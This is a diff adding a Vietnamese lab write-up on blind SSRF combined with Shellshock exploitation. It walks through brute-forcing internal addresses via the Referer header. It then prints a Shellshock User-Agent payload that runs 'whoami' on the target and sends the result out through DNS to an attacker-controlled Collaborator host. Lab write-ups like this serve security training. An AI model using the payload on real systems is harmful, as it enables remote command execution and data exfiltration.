@@ -43,3 +43,25 @@ Trong request `GET /product?productId=2`, ta thay đổi header Refererer trỏ 
 # 6. SSRF with whitelist-based input filter
 
 # 7. Blind SSRF with Shellshock exploitation
+Khi thay đổi Referrer trong request `/product?productId=1` thành địa chỉ của Burp Collaborator, nhận thấy request được gửi đến. Như vậy server sẽ truy cập địa chỉ có trong header Referrer.
+
+Ta cấu hình kịch bản tấn công như sau:
+1) Thay đổi Referrer thành 192.168.0.X (là server có lỗ hổng ShellShock)
+2) Cấu hình tấn công ShellShock để từ máy chủ 192.168.0.X sẽ gửi request đến Burp Collaborator mà ta kiểm soát. Trong request có chứa thông tin ta cần lấy.
+
+Ta sẽ thử thực hiện tấn công Shell shock qua header User-Agent. Đưa request vào Intruder rồi thay đổi như sau:
+
+![image](https://user-images.githubusercontent.com/103978452/206390976-3224b8ca-3593-4d11-8302-76ff046a8256.png)
+Chú ý đến hai header là Referrer và User-Agent. Sau khi thực hiện bruteforce 192.168.0.X với X trong phạm vi từ 0-256, vào Burp Collaborator Client kiểm tra, ta thấy có request được gửi đến.
+
+![image](https://user-images.githubusercontent.com/103978452/206391184-c8b923df-ed65-4332-948e-86f59ae5d59a.png)
+
+Như vậy ta có thể exploit Shell Shock vulnerability theo cách này. Thay đổi header User-Agent như sau:
+```
+User-Agent: () { :; }; /bin/ping $(whoami).6u1yt7352rpz2mzz9d2l02wi89ez2o.oastify.com
+```
+Thực hiện bruteforce như trước đó, rồi kiểm tra trong Burp Collaborator Client thì thấy có request chứa thông tin lệnh `whoami` được gửi đến
+
+![image](https://user-images.githubusercontent.com/103978452/206391484-67f30bd2-16c2-4ac8-ab41-cb859850dfe2.png)
+
+Dùng thông tin có được để submit, bài lab đã được giải.
